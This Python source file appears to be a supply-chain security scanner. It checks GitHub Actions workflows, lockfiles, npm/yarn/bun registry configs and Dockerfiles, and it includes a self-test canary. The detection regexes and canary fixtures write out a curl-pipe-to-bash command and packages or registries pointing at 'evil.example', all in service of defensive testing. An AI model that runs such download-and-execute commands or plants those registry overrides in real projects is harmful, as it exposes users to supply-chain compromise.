            m = re.match(r"^(registry|url)\s*=\s*(.+)$", st)
            if m:
                v = m.group(2).strip()
                if v.startswith("{"):
                    um = re.search(r'url\s*=\s*"([^"]*)"', v)
                    v = um.group(1) if um else v
                if not _registry_ok(v):
                    flag(n, line, "bun registry override to %s" % C.esc(_unquote(v)[:80]))
            if re.match(r"^preload\s*=", st):
                flag(n, line, "bun preload runs code before every bun run/test")


# ---------------------------------------------------------------------------
# S6: GitHub Actions workflows, action.yml files and amplify.yml build specs
# ---------------------------------------------------------------------------
# `uses:` only at a YAML key position: line start (after indentation / list dashes) or inside a
# flow mapping; "name: Explain what this uses: webpack" is not a uses: key
_RX_USES = re.compile(r"""(?:^\s*(?:-\s+)*|[{,]\s*)["']?uses["']?\s*:\s*(.*)$""")
_RX_PINNED = re.compile(r"\A[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+(?:/[^@\s]*)?@[0-9a-fA-F]{40}\Z")
_RX_DOCKER_PINNED = re.compile(r"\Adocker://[^\s@]+@sha256:[0-9a-f]{64}\Z")
_INTERP = r"(?:(?:ba|z|da|k)?sh|python[0-9.]*|node|perl|ruby|bun|deno|pwsh|powershell)"
_SHELLS = (r"(?:sudo\b[^|;&]*?\s)?(?:env\s+(?:\S+=\S*\s+)*)?(?:\S*/)?"
           r"(?:(?:ba|z|da|k)?sh|python[0-9.]*|node|perl|ruby|bun|deno|pwsh|powershell)\b")
_DL = r"(?:curl|wget)\b"
_RX_RISKY = [
    (re.compile(r"\b" + _DL + r".*\|\s*(?:" + _SHELLS + r")"), "downloads and pipes into an interpreter"),
    (re.compile(r"<\(\s*" + _DL), "executes a download via process substitution"),
    (re.compile(r"\b(?:ba|z|da|k)?sh\s+-c\s+[\"']?\$\(\s*" + _DL), "executes a download via sh -c"),
    (re.compile(r"\b" + _INTERP + r"\b[^\n|;&]*?\s-(?:c|e|-eval|p)\s+[\"']?(?:\$\(|`)\s*" + _DL),
     "executes a download as inline code"),
    (re.compile(r"\beval\b[^\n]*?(?:\$\(|`)\s*" + _DL), "evaluates a download"),
    (re.compile(r"(?:^|[;&|({]\s*|\b(?:then|do|else)\s+)[\"']?(?:\$\(|`)\s*" + _DL),
     "runs a download's output as a command"),
    (re.compile(r"\bbase64\s+(?:-d|--decode|-D|-di)\b.*\|\s*(?:" + _SHELLS + r")"),
     "decodes base64 into an interpreter"),
    (re.compile(r"toJSON\(\s*secrets\s*\)"), "serializes every secret"),
]
# document-level findings, checked on every physical line (a key with no scalar value included)
_RX_RISKY_DOC = [
    (re.compile(r"\bpermissions\s*:\s*write-all\b"), "grants write-all permissions"),
    (re.compile(r"\bpull_request_target\b"), "pull_request_target runs with secrets on untrusted PR code"),
]
_RX_SECRET_PRINT = re.compile(r"\b(?:echo|printf|print|cat|tee|Write-Host|Write-Output)\b.*\$\{\{\s*secrets\.")
# runtime registry / install-config tampering
_RX_CONFIG_SET_REGISTRY = re.compile(
    r"\b(?:npm|pnpm|yarn|bun)\s+(?:config\s+set|set)\s+(?:-\S+\s+)*[\"']?((?:@[\w.-]+:)?registry|npmRegistryServer)"
    r"[\"']?(?:\s+|=)[\"']?([^\s\"';&|]*)")
_RX_CONFIG_SET_SCRIPTS = re.compile(r"\b(?:npm|pnpm|yarn)\s+(?:config\s+set|set)\s+(?:-\S+\s+)*[\"']?"
                                    r"(?:ignore-scripts[\"']?(?:\s+|=)[\"']?false|enableScripts[\"']?\s+[\"']?true)")
_RX_REGISTRY_FLAG = re.compile(r"--registry(?:=|\s+)[\"']?([^\s\"';&|]+)")
_RX_PM_CMD = re.compile(r"\b(npm|npx|pnpm|pnpx|yarn|bun|bunx)\b(?:\s+(-\S+|[\w:@./-]+))?")
_NO_INSTALL_SUBCMDS = frozenset(("publish", "view", "info", "show", "dist-tag", "dist-tags", "whoami", "login",
                                 "adduser", "logout", "unpublish", "deprecate", "owner", "access", "token", "ping",
                                 "search", "pack", "star", "unstar", "stars", "team", "org", "profile", "hook"))
_RX_CONFIG_WRITE = re.compile(r"(?:>>?|\btee\b(?:\s+-a)?)\s*[\"']?[^\s;&|\"']*(?:\.npmrc|\.yarnrc(?:\.yml)?|bunfig\.toml"
                              r"|\.pnpmfile\.cjs)\b")
_RX_ENV_REGISTRY = re.compile(r"(?i)\b(npm_config_registry|npm_config_@[\w.-]+:registry|yarn_registry|"
                              r"yarn_npm_registry_server|bun_config_registry)[\"']?\s*[:=]\s*[\"']?([^\s\"']*)")
_RX_ENV_SCRIPTS = re.compile(r"(?i)\b(?:npm_config_ignore_scripts|yarn_ignore_scripts)[\"']?\s*[:=]\s*[\"']?false\b"
                             r"|\byarn_enable_scripts[\"']?\s*[:=]\s*[\"']?true\b")
_RX_NODE_OPTIONS = re.compile(r"\bNODE_OPTIONS[\"']?\s*[:=]\s*[\"']?([^\n]*)")
_RX_URL = re.compile(r"(?i)\b(?:https?:)?//[^\s\"';|&)]+")
# package runners / installers whose arguments are package specs. An option must start with a
# letter or digit after its dashes, so option tokens, their values and the gaps between them
# cannot overlap: '[\w-]+' let 'npm -- -- -- ...' split exponentially many ways (ReDoS). A value's
# first character excludes '-' in the class itself, not via a lookahead, so the regex is
# unambiguous by construction (CodeQL's analysis ignores lookaheads).
_RX_RUNNER = re.compile(
    r"(?:^|[;&|(]\s*|\b(?:then|do|else|sudo|exec|time|xargs)\s+)"
    r"(npx|pnpx|bunx|(?:npm|pnpm|yarn|bun)(?:\s+--?[A-Za-z0-9][\w-]*(?:=\S+|\s+[^\s;&|-][^\s;&|]*)?)*?\s+"
    r"(?:exec|x|dlx|install|i|add|update|up|global\s+add))(?=\s|$)")
_RUNNER_VALUE_FLAGS = frozenset(("--prefix", "-C", "--dir", "-w", "--workspace", "--filter", "-F", "--cwd", "--tag",
                                 "--registry", "--cache", "--userconfig", "--globalconfig", "-c", "--call",
                                 "--shell", "--save-prefix", "--loglevel", "--reporter"))


def _strip_yaml_comment(line):
    q = None
    for i, ch in enumerate(line):
        if q:
            if ch == q:
                q = None
            continue
        if ch in "'\"":
            q = ch
        elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
            return line[:i]
    return line


def check_uses_ref(ref):
    if ref.startswith("./"):
        return None
    if ref.startswith("docker://"):
        return None if _RX_DOCKER_PINNED.match(ref) else "docker image not pinned by @sha256 digest"
    if _RX_PINNED.match(ref):
        return None
    return "action not pinned to a 40-hex commit SHA"


_RX_YAML_KEY = re.compile(r"""(?:"[^"]*"|'[^']*'|[^\s#'"{\[\]|>&*!%@`-][^:#]*?|-[^\s:#][^:#]*?)\s*:(?=\s|$)""")
_RX_BLOCK_IND = re.compile(r"\A([|>])[+-]?[1-9]?[+-]?\s*(?:#.*)?\Z")


def _scalars(raw_lines):
    """Group a YAML file into its scalar values, the way a shell will receive them.

    -> [(key, kind, [(lineno, text), ...])]. kind is '|' (literal block: one shell line per
    text line), '>' (folded block) or 'plain' (plain or quoted scalar; YAML folds its deeper-indented
    continuation lines into one line). key is the mapping key ('' for a list item). A superset
    parser: every deeper-indented line after a scalar start belongs to it, as YAML requires.
    Comments are stripped the way the old line scanner stripped them."""
    out = []
    lines = [l.rstrip("\r") for l in raw_lines]
    i, n = 0, len(lines)
    while i < n:
        line = lines[i]
        s = line.lstrip(" ")
        if not s.strip() or s.startswith("#"):
            i += 1
            continue
        indent = len(line) - len(s)
        pos = indent
        dm = re.match(r"(?:-(?:[ \t]+|\Z))+", s)
        if dm:
            pos += dm.end()
            s = s[dm.end():]
        km = _RX_YAML_KEY.match(s)
        if km:
            key = _unquote(s[:km.end() - 1].strip())
            val = s[km.end():].strip()
            threshold = pos
        else:
            key, val, threshold = "", s.strip(), indent
        if not val or val.startswith("#"):
            i += 1
            continue
        j, body = i + 1, []
        while j < n:
            nl = lines[j]
            if nl.strip() and (len(nl) - len(nl.lstrip(" "))) <= threshold:
                break
            body.append((j + 1, nl))
            j += 1
        while body and not body[-1][1].strip():
            body.pop()
        bm = _RX_BLOCK_IND.match(val)
        if bm:
            out.append((key, bm.group(1), [(ln, _strip_yaml_comment(t).strip()) for ln, t in body]))
        else:
            texts = [(i + 1, _strip_yaml_comment(val).strip())]
            texts += [(ln, _strip_yaml_comment(t).strip()) for ln, t in body]
            out.append((key, "plain", texts))
        i = j if j > i + 1 else i + 1
    return out


def _shell_lines(kind, texts):
    """[(lineno, text)] of one scalar -> [(first_lineno, last_lineno, logical shell line)]."""
    if kind in (">", "plain"):
        res, cur, start, last = [], [], None, None
        for ln, t in texts:
            if not t:
                if cur:
                    res.append((start, last, " ".join(cur)))
                cur, start = [], None
                continue
            if start is None:
                start = ln
            last = ln
            cur.append(t)
        if cur:
            res.append((start, last, " ".join(cur)))
    else:
        res = [(ln, ln, t) for ln, t in texts if t]
    # shell continuations: a trailing backslash, pipe, || or && carries on to the next line
    out, cur, start = [], "", None
    for a, b, t in res:
        if start is None:
            start = a
        s = t.rstrip()
        if s.endswith("\\") and not s.endswith("\\\\"):
            cur += s[:-1] + " "
            continue
        if re.search(r"(?:\|\||&&|\|)\Z", s):
            cur += s + " "
            continue
        out.append((start, b, cur + t))
        cur, start = "", None
    if cur:
        out.append((start, res[-1][1], cur))
    return out


def _downloads(seg):
    """Files a curl/wget command in one shell segment writes: [(path_as_written, basename)]."""
    out = []
    for m in re.finditer(r"\b(curl|wget)\b([^|]*)", seg):
        tool, args = m.group(1), m.group(2)
        targets = []
        for om in re.finditer(r"(?:^|\s)(-[a-zA-Z]*o|--output|--output-document|-[a-zA-Z]*O)(?:=|\s*)[\"']?([^\s\"']+)",
                              args):
            flag = om.group(1)
            if tool == "curl" and flag.endswith("O") and not flag.startswith("--"):
                continue   # curl -O: remote name, handled below
            if tool == "wget" and flag.endswith("o") and not flag.startswith("--"):
                continue   # wget -o is the log file
            targets.append(om.group(2))
        rm = re.search(r"(?:^|\s)>>?\s*[\"']?([^\s\"';&|]+)", args)
        if rm:
            targets.append(rm.group(1))
        if (tool == "curl" and re.search(r"(?:^|\s)(?:-[a-zA-Z]*O|--remote-name)(?=\s|$)", args)) or \
                (tool == "wget" and not re.search(r"(?:^|\s)(?:-[a-zA-Z]*O|--output-document)", args)):
            um = _RX_URL.search(args)
            if um:
                bn = um.group(0).rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
                if bn:
                    targets.append(bn)
        for t in targets:
            if t not in ("-", "/dev/null", "/dev/stdout", "/dev/stderr"):
                out.append((t, t.rsplit("/", 1)[-1]))
    return out


_RX_EXEC_PREFIX = r"\A(?:(?:then|do|else|sudo|exec|time|nohup|command)\s+(?:-\S+\s+)*|env\s+(?:\S+=\S*\s+)*)*"


def _executes(seg, target):
    """Does this shell segment execute the downloaded file?"""
    path, base = target
    interp = [path, base, "./" + base]
    direct = [path] if "/" in path else []
    direct.append("./" + base)
    for c in set(interp):
        if re.search(_RX_EXEC_PREFIX + r"(?:(?:\S*/)?" + _INTERP + r"\s+(?:-\S+\s+)*(?:<\s*)?|source\s+|\.\s+)"
                     r"[\"']?" + re.escape(c) + r"[\"']?(?:\s|\Z)", seg):
            return True
    for c in set(direct):
        if re.search(_RX_EXEC_PREFIX + r"[\"']?" + re.escape(c) + r"[\"']?(?:\s|\Z)", seg):
            return True
    return False


def _remote_specs(text):
    """Package specs handed to npx / npm exec / pnpm dlx / installers that fetch code from a
    non-registry source: [(spec, problem)]."""
    res = []
    for m in _RX_RUNNER.finditer(text):
        words = m.group(1).split()
        once = words[0] in ("npx", "pnpx", "bunx") or words[-1] in ("exec", "x", "dlx")
        rest = re.split(r"\s(?:&&|\|\||\|)\s|[;)]|\s#", text[m.end():], 1)[0]
        toks = re.findall(r"\"[^\"]*\"|'[^']*'|\S+", rest)
        k = 0
        while k < len(toks):
            tok = toks[k].strip("\"'")
            k += 1
            if tok == "--":
                break
            if tok.startswith("-"):
                name, eq, val = tok.partition("=")
                if name in ("--package", "-p") and (eq or k < len(toks)):
                    spec = val if eq else toks[k].strip("\"'")
                    if not eq:
                        k += 1
                    prob = _spec_problem(spec, "")
                    if prob:
                        res.append((spec, prob))
                elif name in _RUNNER_VALUE_FLAGS and not eq:
                    k += 1
                continue
            rng = _spec_range(tok)
            prob = _spec_problem(tok, "") or (_spec_problem(rng, "") if rng else None)
            if prob:
                res.append((tok, prob))
            if once:
                break
    return res


def _registry_tamper(text, keyed):
    """Messages for registry / install-config changes made at run time. `keyed` is the same text
    with its YAML key in front (`NPM_CONFIG_REGISTRY: https://...` in an env: block)."""
    msgs = []
    for m in _RX_CONFIG_SET_REGISTRY.finditer(text):
        if not _registry_ok(m.group(2)):
            msgs.append("sets the %s to %s at run time" % (m.group(1), C.esc(m.group(2)[:80] or "<empty>")))
    if _RX_CONFIG_SET_SCRIPTS.search(text):
        msgs.append("re-enables install scripts at run time")
    for m in _RX_REGISTRY_FLAG.finditer(text):
        pm = None
        for pm in _RX_PM_CMD.finditer(text[:m.start()]):
            pass
        if pm is not None and pm.group(2) in _NO_INSTALL_SUBCMDS:
            continue
        if not _registry_ok(m.group(1)):
            msgs.append("installs from registry %s" % C.esc(m.group(1)[:80]))
    if _RX_CONFIG_WRITE.search(text):
        if "registry" in text.lower():
            for u in _RX_URL.findall(text):
                host = re.sub(r"(?i)\A(?:https?:)?//", "", u).split("/", 1)[0].split(":", 1)[0].lower()
                if host != "registry.npmjs.org":
                    msgs.append("writes registry %s into an npm/yarn/bun config file" % C.esc(u[:80]))
                    break
            if re.search(r"(?i)registry[\"']?\s*[=:\s]\s*[\"']?\$", text):
                msgs.append("writes a registry from a variable into an npm/yarn/bun config file")
        if re.search(r"(?i)ignore-scripts\s*[= ]\s*false|enableScripts\s*:\s*true|node-options|onload-script|"
                     r"script-shell|yarnPath|yarn-path|preload\s*=|\.pnpmfile\.cjs", text):
            msgs.append("writes an install hook or script setting into an npm/yarn/bun/pnpm config file")
    for m in _RX_ENV_REGISTRY.finditer(keyed):
        if m.group(2) and not _registry_ok(m.group(2)):
            msgs.append("sets %s to %s" % (m.group(1), C.esc(m.group(2)[:80])))
    if _RX_ENV_SCRIPTS.search(keyed):
        msgs.append("re-enables install scripts through the environment")
    nm = _RX_NODE_OPTIONS.search(keyed)
    if nm and _RX_PRELOAD_OPTS.search(nm.group(1)):
        msgs.append("NODE_OPTIONS preloads code into every node process")
    return msgs


def check_workflow(repo, path, emit):
    text = repo.read(path).decode("utf-8", "surrogateescape")
    raw_lines = text.split("\n")
    for i, raw in enumerate(raw_lines):
        line = raw.rstrip("\r")
        code = _strip_yaml_comment(line)
        if not _is_amplify(path):
            m = _RX_USES.search(code)
            if m:
                tm = re.match(r"""\s*(["']?)([^\s,}"']*)""", m.group(1))
                ref = tm.group(2) if tm else m.group(1).strip()
                prob = check_uses_ref(ref)
                if prob:
                    emit(Finding("S6", path, i + 1, line.find("uses") + 1, "%s: %s" % (prob, C.esc(ref[:100])), ref,
                                 C.esc(line.strip()[:120])))
        for rx, msg in _RX_RISKY_DOC:
            rm = rx.search(code)
            if rm:
                emit(Finding("S6", path, i + 1, rm.start() + 1, msg, line, C.esc(line.strip()[:120])))

    def report(a, b, col, msg, logical):
        # fingerprint: the physical line when the command sits on one line (as v1 did), else the
        # whole logical command
        value = raw_lines[a - 1].rstrip("\r") if a == b and 0 < a <= len(raw_lines) else logical
        emit(Finding("S6", path, a, col, msg, value, C.esc(logical.strip()[:120])))

    for key, kind, texts in _scalars(raw_lines):
        downloads = []
        for a, b, logical in _shell_lines(kind, texts):
            for rx, msg in _RX_RISKY:
                rm = rx.search(logical)
                if rm:
                    report(a, b, rm.start() + 1, msg, logical)
            sm = _RX_SECRET_PRINT.search(logical)
            if sm:
                report(a, b, sm.start() + 1, "prints a secret into the log", logical)
            for msg in _registry_tamper(logical, (key + ": " + logical) if key else logical):
                report(a, b, 1, msg, logical)
            for spec, prob in _remote_specs(logical):
                report(a, b, 1, "runs or installs a package from a non-registry source (%s): %s"
                       % (prob, C.esc(spec[:80])), logical)
            for seg in re.split(r"&&|\|\||;", logical):
                seg = seg.strip()
                for t in downloads:
                    if _executes(seg, t):
                        report(a, b, 1, "executes a downloaded file (%s)" % C.esc(t[0][:80]), logical)
                        break
                downloads.extend(_downloads(seg))




# ---------------------------------------------------------------------------
# S7: Docker base images (report only)
# ---------------------------------------------------------------------------
def report_docker(repo, path, notes):
    text = repo.read(path).decode("utf-8", "surrogateescape")
    stages = set()
    for n, raw in enumerate(text.split("\n"), 1):
        m = re.match(r"^\s*FROM\s+(?:--\S+\s+)*(\S+)(?:\s+AS\s+(\S+))?", raw.rstrip("\r"), re.I)
        if not m:
            continue
        img = m.group(1)
        if m.group(2):
            stages.add(m.group(2).lower())
        if "@sha256:" in img or img.lower() == "scratch" or img.lower() in stages or "$" in img:
            continue
        notes.append("S7 %s:%d: base image %s is not pinned by digest (report only)" % (C.esc(path), n, C.esc(img[:100])))


# ---------------------------------------------------------------------------
# driver
# ---------------------------------------------------------------------------
NPM_LOCKS = ("package-lock.json", "npm-shrinkwrap.json")
OTHER_JS_LOCKS = ("yarn.lock", "bun.lock", "bun.lockb", "deno.lock")
REGISTRY_FILES = (".npmrc", ".yarnrc", ".yarnrc.yml", ".pnpmfile.cjs", "bunfig.toml")


def _is_workflow(p):
    return p.startswith(".github/workflows/") and p.lower().endswith((".yml", ".yaml"))


def _is_action(p):
    return _base(p) in ("action.yml", "action.yaml")


def _is_amplify(p):
    return _base(p).lower() in ("amplify.yml", "amplify.yaml")


def _is_dockerfile(p):
    b = _base(p)
    return b == "Dockerfile" or b == "Containerfile" or b.startswith("Dockerfile.") or b.endswith(".Dockerfile")


def scan(repo, checks, notes):
    findings = []
    emit = findings.append
    files = repo.regular
    for path in files:
        b = _base(path)
        if b in NPM_LOCKS and ("S1" in checks or "S4" in checks):
            sub = []
            scripts = check_npm_lock(repo, path, sub.append) or {}
            if "S1" in checks:
                findings.extend(sub)
            if "S4" in checks:
                text = repo.read(path).decode("utf-8", "surrogateescape")
                for name, key in sorted(scripts.items()):
                    line, col = _find_line(text, json.dumps(key))
                    emit(Finding("S4", path, line, col, "package %s runs an install script" % C.esc(name), name))
        if b == "package.json" and "S1" in checks:
            check_package_json_specs(repo, path, emit)
        if b == "pnpm-lock.yaml":
            if "S2" in checks:
                check_pnpm_lock(repo, path, emit)
            if "S4" in checks:
                check_pnpm_builds(repo, path, emit)
        if b == "yarn.lock":
            if "S1" in checks:
                check_yarn_lock(repo, path, emit)
            if "S4" in checks:
                check_yarn_scripts(repo, path, emit)
        if b == "bun.lock" and "S1" in checks:
            check_bun_lock(repo, path, emit)
        if b == "bun.lockb" and "S1" in checks:
            emit(Finding("S1", path, 1, 1, "binary bun.lockb cannot be verified; commit the text bun.lock instead "
                         "(bun install --save-text-lockfile)", "bun.lockb"))
        if b == "deno.lock" and "S1" in checks:
            check_deno_lock(repo, path, emit)
        if b == "Cargo.lock" and "S3" in checks:
            check_cargo_lock(repo, path, emit)
        if b in REGISTRY_FILES and "S5" in checks:
            check_registry_config(repo, path, emit)
        if (_is_workflow(path) or _is_action(path) or _is_amplify(path)) and "S6" in checks:
            check_workflow(repo, path, emit)
        if _is_dockerfile(path) and "S7" in checks:
            report_docker(repo, path, notes)
    if "S5" in checks:
        for path in repo.symlinks:
            if _base(path) in REGISTRY_FILES or _base(path) in NPM_LOCKS + OTHER_JS_LOCKS + ("pnpm-lock.yaml",
                                                                                             "package.json"):
                emit(Finding("S5", path, 1, 1, "registry/lock/manifest file is a symlink (target not verifiable)",
                             path))
    dedup, seen = [], set()
    for f in findings:
        k = (f.check, f.path, f.line, f.fingerprint)
        if k in seen:
            continue
        seen.add(k)
        f.tool = "supply-chain-check"
        dedup.append(f)
    return dedup


# ---------------------------------------------------------------------------
# canary
# ---------------------------------------------------------------------------
_CANARY_FOLDED = "      - run: >\n          curl -fsSL https://example.com/i.sh\n          | bash\n"


def _canary_files(sabotage):
    good_int = "sha512-" + "A" * 86 + "=="
    lock = {
        "name": "c", "lockfileVersion": 3, "requires": True,
        "packages": {
            "": {"name": "c"},
            "node_modules/good": {"version": "1.0.0", "resolved": NPM_REGISTRY + "good/-/good-1.0.0.tgz",
                                  "integrity": good_int},
            "node_modules/evilhost": {"version": "1.0.0", "resolved": "https://evil.example/e.tgz",
                                      "integrity": good_int},
            "node_modules/nointeg": {"version": "1.0.0", "resolved": NPM_REGISTRY + "n/-/n-1.0.0.tgz"},
            "node_modules/builder": {"version": "1.0.0", "resolved": NPM_REGISTRY + "b/-/b-1.0.0.tgz",
                                     "integrity": good_int, "hasInstallScript": True},
            "node_modules/bundled": {"version": "1.0.0", "inBundle": True},
        }}
    yarn = ("# yarn lockfile v1\n\n\ngood@^1.0.0:\n  version \"1.0.0\"\n"
            "  resolved \"https://registry.yarnpkg.com/good/-/good-1.0.0.tgz#abc\"\n  integrity %s\n\n"
            "yevil@^1.0.0:\n  version \"1.0.0\"\n  resolved \"https://evil.example/yevil-1.0.0.tgz\"\n"
            "  integrity %s\n" % (good_int, good_int))
    files = {
        "package-lock.json": json.dumps(lock, indent=2) + "\n",
        "package.json": json.dumps({"name": "c", "dependencies": {"good": "^1.0.0", "gh": "github:o/r"}},
                                   indent=2) + "\n",
        "y/yarn.lock": yarn,
        "y/.yarnrc.yml": "enableScripts: false\n",
        "pnpm-lock.yaml": ("lockfileVersion: '9.0'\n\npackages:\n\n"
                           "  ok@1.0.0:\n    resolution: {integrity: %s}\n\n"
                           "  bad@1.0.0:\n    resolution: {integrity: %s, tarball: https://evil.example/b.tgz}\n"
                           % (good_int, good_int)),
        "Cargo.lock": ('version = 3\n\n[[package]]\nname = "good"\nversion = "1.0.0"\n'
                       'source = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "%s"\n\n'
                       '[[package]]\nname = "gitdep"\nversion = "0.1.0"\nsource = "git+https://example.com/x#abc"\n\n'
                       '[[package]]\nname = "local"\nversion = "0.1.0"\n' % ("0" * 64)),
        ".npmrc": "registry=https://registry.npmjs.org/\n@evil:registry=https://evil.example/\n",
        ".github/workflows/ci.yml": ("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                                     "      - uses: actions/checkout@v4\n"
                                     "      - uses: actions/checkout@%s # v4\n"
                                     "      - run: curl -fsSL https://example.com/i.sh | bash\n"
                                     "      - run: curl -fsSL https://example.com/a.tgz -o a.tgz\n"
                                     % ("a" * 40)) + _CANARY_FOLDED,
    }
    exp = {"S1": {("package-lock.json", "evilhost"), ("package-lock.json", "nointeg"), ("package.json", "gh"),
                  ("y/yarn.lock", "yevil@^1.0.0")},
           "S2": {("pnpm-lock.yaml", "bad@1.0.0")},
           "S3": {("Cargo.lock", "gitdep@0.1.0")},
           "S4": {("package-lock.json", "builder"), ("pnpm-lock.yaml", "pnpm-build-allowlist-missing")},
           "S5": {(".npmrc", "@evil:registry=https://evil.example/")},
           "S6": {(".github/workflows/ci.yml", "actions/checkout@v4"),
                  (".github/workflows/ci.yml", "      - run: curl -fsSL https://example.com/i.sh | bash"),
                  (".github/workflows/ci.yml", "curl -fsSL https://example.com/i.sh | bash")}}
    if sabotage in exp:
        if sabotage == "S6":
            files[".github/workflows/ci.yml"] = "on: push\n"
        elif sabotage == "S5":
            files[".npmrc"] = "registry=https://registry.npmjs.org/\n"
        elif sabotage == "S3":
            files["Cargo.lock"] = "version = 3\n"
        elif sabotage == "S2":
            files["pnpm-lock.yaml"] = "lockfileVersion: '9.0'\n"
        else:
            files["package-lock.json"] = json.dumps({"lockfileVersion": 3, "packages": {"": {}}})
            files["package.json"] = "{}\n"
            files["y/yarn.lock"] = "# yarn lockfile v1\n"
    return files, exp


def _canary_token(f):
    """Reduce a finding to the canary's (path, token) vocabulary."""
    v = f.value.decode("utf-8", "surrogateescape") if isinstance(f.value, bytes) else f.value
    if f.check in ("S1", "S2", "S3"):
        head = v.split("\t", 1)[0]
        if f.check == "S1" and f.path.endswith("package.json"):
            return v.split("\t", 1)[1].split("=", 1)[0]
        return _pkg_name_from_key(head)
    return v


def run_canary(checks, sabotage=None):
    tmp = tempfile.mkdtemp(prefix="scg-canary-")
    try:
        files, exp = _canary_files(sabotage)
        for rel, content in files.items():
            full = os.path.join(tmp, rel)
            d = os.path.dirname(full)
            if not os.path.isdir(d):
                os.makedirs(d)
            with open(full, "wb") as fh:
                fh.write(content.encode("utf-8"))
        env = C.tool_env()
        env["GIT_CONFIG_NOSYSTEM"] = "1"
        env["GIT_CONFIG_GLOBAL"] = os.devnull
        C.run_git(["init", "-q", tmp], cwd=tmp, env=env)
        C.run_git(["add", "-A"], cwd=tmp, env=env)
        repo = C.Repo(tmp, env=env)
        found = scan(repo, [c for c in checks if c != "S7"], [])
        got = {}
        for f in found:
            got.setdefault(f.check, set()).add((f.path, _canary_token(f)))
        problems = []
        for check in checks:
            if check == "S7":
                continue
            e, g = exp.get(check, set()), got.get(check, set())
            for miss in sorted(e - g):
                problems.append("%s missed its canary %s (%s)" % (check, miss[0], C.esc(miss[1])))
            for extra in sorted(g - e):
                problems.append("%s false positive on its canary %s (%s)" % (check, extra[0], C.esc(extra[1])))
        return problems
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
